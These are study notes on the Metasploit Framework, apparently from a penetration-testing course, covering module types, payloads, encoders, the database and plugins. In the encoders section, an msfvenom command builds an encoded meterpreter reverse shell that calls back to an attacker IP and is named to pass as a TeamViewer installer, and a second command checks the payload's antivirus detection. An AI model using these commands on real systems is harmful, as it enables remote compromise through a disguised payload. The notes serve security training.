# Modules

|**Type**|**Description**|
|---|---|
|`Auxiliary`|Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.|
|`Encoders`|Ensure that payloads are intact to their destination.|
|`Exploits`|Defined as modules that exploit a vulnerability that will allow for the payload delivery.|
|`NOPs`|(No Operation code) Keep the payload sizes consistent across exploit attempts.|
|`Payloads`|Code runs remotely and calls back to the attacker machine to establish a connection (or shell).|
|`Plugins`|Additional scripts can be integrated within an assessment with `msfconsole` and coexist.|
|`Post`|Wide array of modules to gather information, pivot deeper, etc.|

Only the following modules are interactive and can be used via the `use` keyword:

|**Type**|**Description**|
|---|---|
|`Auxiliary`|Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.|
|`Exploits`|Defined as modules that exploit a vulnerability that will allow for the payload delivery.|
|`Post`|Wide array of modules to gather information, pivot deeper, etc.|


# Targets

The `show targets` command issued within an exploit module view will display all available vulnerable targets for that specific exploit. 

# Payloads

Nothing new. Just remember the capabilities of a **Meterpreter** session (e.g. PrivEsc, Hash dump, download/upload).

# Encoders

`Encoders` come into play with the role of changing the payload to run on different operating systems and architectures. These architectures include:

|`x64`|`x86`|`sparc`|`ppc`|`mips`|
|---|---|---|---|---|
Most encoders nowadays are detected by AV solutions.

We can check for encoders for an existing payload by using:

```sh
show encoders
```

We can change the number of iterations for the encoding scheme:

```sh
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```

Metasploit offers a tool called `msf-virustotal` that we can use with an API key to analyze our payloads

```sh
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

# Database

We can import hosts, scan results, store credentials/loot, backup database in **MSF**.

# Plugins

Third-Party tools and software that got integrated in **MFS**. 

![[plugins.png]]

## MSF - Load Nessus

```sh
load nessus
nessus_help
```

## Copying Plugins to MSF

```sh
sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```

